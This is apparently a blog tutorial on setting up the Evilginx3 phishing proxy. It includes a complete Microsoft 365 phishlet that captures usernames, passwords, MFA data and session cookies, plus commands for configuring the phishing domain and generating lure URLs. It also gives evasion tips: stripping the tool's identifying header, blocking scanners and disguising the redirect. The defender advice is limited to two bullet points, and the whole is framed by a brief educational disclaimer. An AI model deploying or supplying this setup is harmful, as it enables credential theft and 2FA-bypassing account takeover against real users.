---
title: "How to Set Up Evilginx3"
date: 2023-07-16
description: "Quick tutorial on how to set up evilginx3 phishing framework"
summary: "Quick tutorial on how to set up evilginx3 phishing framework"
tags: ["phishing"]
---

## What is Evilginx?

Evilginx is a tool created by security researcher [Kuba Gretzky](https://twitter.com/mrgretzky), designed for advanced phishing attacks.

As per the [GitHub page](https://github.com/kgretzky/evilginx2):

> Evilginx is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

> The present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.

Please refer to [documentation](https://help.evilginx.com/) and consider signing up for the [Evilginx Mastery course](https://academy.breakdev.org/evilginx-mastery) to learn how to build custom / advanced phishlets.

It's important to note that phishing is illegal and unethical without proper authorization. This information is provided for educational purposes only, and I strongly discourage any misuse or illegal activities.

## Domain Setup

![michaelsoft](/images/evilginx3/michaelsoft.png)

The domain setup process is fairly simple, but will depend on the domain registrar you use. Here's a general overview of how it typically works:

* **Domain Registration**: Register a domain name for your phishing campaign.
* **DNS Configuration**: After registering the domain, you need to configure the domain's DNS settings. Evilginx will act the DNS resolver, so you don't need to manually add "A" records for your phishing domain / subdomains yourself. Instead you will change the glue records for your domain. **Note**: this is not supported by all domain registrars. 

A glue record contains the IP address of a nameserver, enabling the resolution of a domain when the nameserver is hosted within the same domain. For example, if the domain "example.com" has the nameserver "ns1.example.com", a glue record would provide the necessary IP address for the "ns1.example.com" nameserver to be correctly resolved.

Using Godaddy for example (not an endorsement), with a fake domain `michaelsoft.com` and assuming Evilginx is externally accessible via the following IP address `3.105.197.139`:
	
**Create hostname records**:
	
![godaddy-hostname](/images/evilginx3/godaddy-hostname.png)
	
**Change the nameserver**:

![godaddy-nameserver](/images/evilginx3/godaddy-nameserver.png)


## Virtual Private Server Setup

The steps to configure an external phishing host with evilginx is already well [documented](https://help.evilginx.com/docs/getting-started/deployment/remote), so I have created the following bash script to automate this step. 

Keep in mind the following:

* This script is intended to be run on a fresh ubuntu linux host (I have not tested it on any other OS)
* You may want to update the version of golang (don't forget to update the checksum too)
* You may want to use a different terminal multiplexer (tmux instead of byobu)
* OPSEC: I have removed the lines of source code responsible for setting the `X-Evilginx header` - this may change in future releases of evilginx
* You will need to configure firewall rules to allow inbound connections for HTTPS and DNS traffic


{{< gist dunderhay d5fcded54cc88a1b7e12599839b6badb >}}


## Evilginx3 Configuration

You should now be able to create your own phishlets in `/home/ubuntu/evilginx/phishlets` such as the following `m365.yaml` phishlet for targeting Microsoft 365. More information on the phishlet format for v.3.0.0 and above can be found [here](https://help.evilginx.com/docs/phishlet-format).

```yaml
name: 'Microsoft 365'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT', 'SignInStateCookie:always']
    type: 'cookie'
credentials:
  username:
    key: '(login|UserName)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|accesspass)'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'mfaAuthMethod'
      search: '(.*)'
      type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/?auth=2'
```

After starting Evilginx, you can set the required values:

```
config domain <your-phishing-domain>
config ipv4 external <your-vps-ipaddress>
```

It is recommended to prevent access from unauthorised prying eyes / scanners:

```
blacklist unauth
```

I also recommend changing the `redirect_url` from the default rick roll to something a little less obvious:

```
config redirect_url https://example.com
```

Configure the phishlet and lure:

```
phishlets hostname m365 <your-phishing-domain>
phishlets enable m365
lures create m365
lures get-url 0
```

The lure URL can be modified to fit your pretext, type `help lures` to get more info on what you can change.

There is a lot to cover when it comes to creating custom phishlets which is best covered in the [Evilginx Mastery course](https://academy.breakdev.org/evilginx-mastery) material. 


## Tips for Defenders

* Perform location validation
* Perform secret token validation

Both of these topics are covered in the [Evilginx Mastery course](https://academy.breakdev.org/evilginx-mastery). 

